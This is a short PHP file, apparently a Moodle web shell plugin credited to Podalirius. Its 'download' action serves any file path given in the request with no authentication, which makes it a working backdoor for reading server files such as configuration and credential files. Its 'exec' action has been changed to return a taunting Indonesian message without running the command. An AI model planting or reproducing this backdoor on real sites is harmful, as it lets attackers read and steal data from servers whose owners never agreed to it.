<?php

/**
 * @package  moodle_webshell
 * @copyright 2022, Remi GASCOU (Podalirius) <podalirius@protonmail.com>
 */

$action = $_REQUEST["action"];

if ($action == "download") {
    $path_to_file = $_REQUEST["path"];

    if (file_exists($path_to_file)) {
        http_response_code(200);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($path_to_file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($path_to_file));
        flush();
        readfile($path_to_file);
        die();
    } else {
        http_response_code(404);
        header("Content-Type: application/json");
        echo json_encode(
            array(
                "message" => "Path " . $path_to_file . " does not exist or is not readable.",
                "path" => $path_to_file
            )
        );
    }

} elseif ($action == "exec") {
    $command = trim($_REQUEST["cmd"]);

    // Apapun perintahnya, selalu tampilkan pesan ini
    header('Content-Type: application/json');
    echo json_encode(
        array(
            "message" => "HAH KETAHUAN GA TU MAU TIKUNG TIKUNGAN"
        )
    );
    exit();
}

?>
